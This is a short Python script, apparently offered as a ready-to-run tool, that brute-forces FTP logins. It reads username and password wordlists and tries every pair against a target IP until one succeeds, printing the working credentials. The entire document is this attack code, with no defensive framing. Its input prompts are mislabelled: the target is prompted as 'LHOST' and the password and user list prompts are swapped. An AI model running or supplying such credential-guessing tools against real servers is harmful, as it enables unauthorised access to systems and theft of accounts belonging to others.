import ftplib

def exploit_ftp_login(target_ip, username_file, password_file):
    # Create an FTP connection
    ftp = ftplib.FTP(target_ip)
    
    # Read usernames from the file
    with open(username_file, "r") as file:
        usernames = file.read().splitlines()
    
    # Read passwords from the file
    with open(password_file, "r") as file:
        passwords = file.read().splitlines()
    
    # Iterate over the usernames and passwords
    for username in usernames:
        for password in passwords:
            try:
                # Attempt to login with the provided credentials
                ftp.login(username, password)
                print(f"Login successful with username: {username} and password: {password}")
                return
            except ftplib.error_perm:
                print(f"Login failed with username: {username} and password: {password}")
    
    # Close the FTP connection
    ftp.quit()

# Example usage
target_ip = input("LHOST: ")
username_file = input("PASSLIST: ")
password_file = input("USERLIST: ")
exploit_ftp_login(target_ip, username_file, password_file)
